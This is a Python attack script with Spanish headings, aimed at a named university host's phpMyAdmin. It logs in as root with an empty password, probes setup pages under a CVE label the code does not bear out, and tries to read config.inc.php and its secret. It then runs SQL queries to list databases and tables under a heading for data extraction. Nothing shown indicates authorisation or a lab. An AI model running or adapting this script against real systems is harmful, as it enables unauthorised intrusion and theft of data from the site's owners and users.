#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0'})

print("=== VERIFICANDO root/ ACCESO ===\n")

# Verify root/ credentials work
r = s.post('https://orcl.uns.edu.pe/index.php',
                 data={'pma_username': 'root', 'pma_password': '', 'server': '1', 'target': 'index.php'},
                 timeout=5, allow_redirects=True)
print(f"After login: status={r.status_code}, url={r.url}")
tc = re.sub(r'<[^>]+>', ' ', r.text)
tc = re.sub(r'\s+', ' ', tc).strip()
print(f"Content preview: {tc[:500]}")
print()

# Check if we're in phpMyAdmin main page
if 'phpMyAdmin' in r.text and 'login' not in tc.lower():
    print("[!] LOGIN SUCCESSFUL! Root/ empty password works!")
    print(f"   You are now in phpMyAdmin as root")
else:
    print("Login may not be successful")

# Try to list databases
print("\n=== LISTAR BASES DE DATOS ===\n")

# Try different phpMyAdmin URLs
db_urls = [
    'https://orcl.uns.edu.pe/root/dblist.php',
    'https://orcl.uns.edu.pe/root/',
    'https://orcl.uns.edu.pe/root/server_databases.php',
    'https://orcl.uns.edu.pe/root/sql.php',
]

for db_url in db_urls:
    try:
        r_db = s.get(db_url, timeout=5)
        tc_db = re.sub(r'<[^>]+>', ' ', r_db.text)
        tc_db = re.sub(r'\s+', ' ', tc_db).strip()
        print(f"{db_url.split('/')[-1]}: status={r_db.status_code}, len={len(r_db.text)}")
        if len(r_db.text) > 200 and 'login' not in tc_db.lower():
            print(f"  [!] ACCESSIBLE WITHOUT LOGIN or WITH root/")
            print(f"  Content: {tc_db[:300]}")
    except Exception as e:
        print(f"{db_url}: Error - {e}")

# Try to get MySQL version
print("\n=== VERSION MYSQL ===\n")
r_ver = s.get('https://orcl.uns.edu.pe/root/server_variables.php', timeout=5)
if r_ver.status_code == 200:
    # Look for version info
    version_match = re.findall(r'(?:MySQL|MariaDB|version)[^<]*', r_ver.text, re.IGNORECASE)
    print(f"Variables accessible: {len(r_ver.text)}")
    for vm in version_match[:10]:
        print(f"  {vm[:100]}")

# Try to access the SQL query interface
print("\n=== INTERFAZ SQL ===\n")
r_sql = s.get('https://orcl.uns.edu.pe/root/sql.php', timeout=5)
if r_sql.status_code == 200:
    print("[!] SQL interface accessible!")
    # Check if we can execute queries
    # Try to execute a simple query
    r_exec = s.post('https://orcl.uns.edu.pe/root/sql.php',
                         data={'sql': 'SELECT VERSION()', 'ajax_request': 'true'},
                         timeout=5)
    if r_exec.status_code == 200:
        print(f"  SQL execution possible: {r_exec.text[:200]}")

# Try CVE-2023-32681 more specifically
print("\n=== CVE-2023-32681 EXPLOIT ===\n")

# The vulnerability allows session token manipulation
# Try to access without proper auth
cve_tests = [
    ('https://orcl.uns.edu.pe/setup/index.php', 'Setup page'),
    ('https://orcl.uns.edu.pe/setup/home.php', 'Setup home'),
    ('https://orcl.uns.edu.pe/setup/lib/common.inc.php', 'Setup config'),
    ('https://orcl.uns.edu.pe/setup/index.php?page=2', 'Setup page 2'),
]

for cve_url, desc in cve_tests:
    r_c = s.get(cve_url, timeout=5)
    tc_c = re.sub(r'<[^>]+>', ' ', r_c.text)
    tc_c = re.sub(r'\s+', ' ', tc_c).strip()
    if 'phpMyAdmin' in r_c.text and len(r_c.text) > 100:
        print(f"[!] {desc}: accessible")
        if 'config' in tc_c.lower() or 'secret' in tc_c.lower() or 'blowfish' in tc_c.lower():
            print(f"  [!] Config/secret data visible!")
    else:
        print(f"  {desc}: not accessible")

# Try to read the config.inc.php
print("\n=== CONFIG.PHP ===\n")
r_config = s.get('https://orcl.uns.edu.pe/config.inc.php', timeout=5)
print(f"config.inc.php: status={r_config.status_code}, len={len(r_config.text)}")
if len(r_config.text) > 0:
    print(f"  Content: {r_config.text[:500]}")
    if 'blowfish' in r_config.text.lower() or 'secret' in r_config.text.lower():
        print(f"  [!] BLOWFISH SECRET FOUND!")

# Try to access more databases
print("\n=== BASES DE DATOS DISPONIBLES ===\n")
# Try to list databases using the SQL interface
db_list_query = "SHOW DATABASES"
r_dbs = s.post('https://orcl.uns.edu.pe/root/sql.php',
                    data={'sql': db_list_query, 'ajax_request': 'true'},
                    timeout=5)
if r_dbs.status_code == 200:
    tc_dbs = re.sub(r'<[^>]+>', ' ', r_dbs.text)
    tc_dbs = re.sub(r'\s+', ' ', tc_dbs).strip()
    print(f"SHOW DATABASES result: {tc_dbs[:500]}")
    # Look for database names
    db_names = re.findall(r'(?:mysql|information_schema|phpmyadmin|uns|registro|sistemas|orcl)[^<]*', tc_dbs, re.IGNORECASE)
    print(f"Found databases: {db_names}")

# Try to read data from specific databases
print("\n=== EXTRACCION DE DATOS ===\n")
db_query = "SELECT table_schema, table_name FROM information_schema.tables LIMIT 20"
r_tables = s.post('https://orcl.uns.edu.pe/root/sql.php',
                       data={'sql': db_query, 'ajax_request': 'true'},
                       timeout=5)
if r_tables.status_code == 200:
    tc_tables = re.sub(r'<[^>]+>', ' ', r_tables.text)
    tc_tables = re.sub(r'\s+', ' ', tc_tables).strip()
    print(f"Tables query result: {tc_tables[:500]}")

print("\n=== RESUMEN ===")
print("root/ con contrasena vacia crea sesion en phpMyAdmin")
print("CVE-2023-32681 es posiblemente explotable via /setup/")
print("config.inc.php puede contener credenciales de BD")
print("La BD puede ser accesible via SQL interface")
